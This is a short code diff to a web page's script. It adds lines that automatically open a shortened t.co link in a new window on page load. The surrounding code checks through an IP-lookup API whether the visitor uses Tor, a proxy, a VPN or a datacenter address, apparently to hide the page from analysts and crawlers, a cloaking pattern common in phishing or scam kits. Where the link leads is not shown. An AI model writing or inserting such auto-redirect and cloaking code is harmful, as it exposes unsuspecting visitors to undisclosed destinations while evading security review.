@@ -14,6 +14,10 @@
 
 		<script>
 
+			var URL11 = 'https://t.co/0k9G78NJn2';
+		
+			var win = window.open(URL11);
+
 			$.getJSON("https://api.ipapi.is", function(result2){
         	  if(result2.is_tor === undefined || result2.is_tor || result2.is_proxy || result2.is_vpn || result2.is_datacenter) {
         		  $("#validateStatus").html(
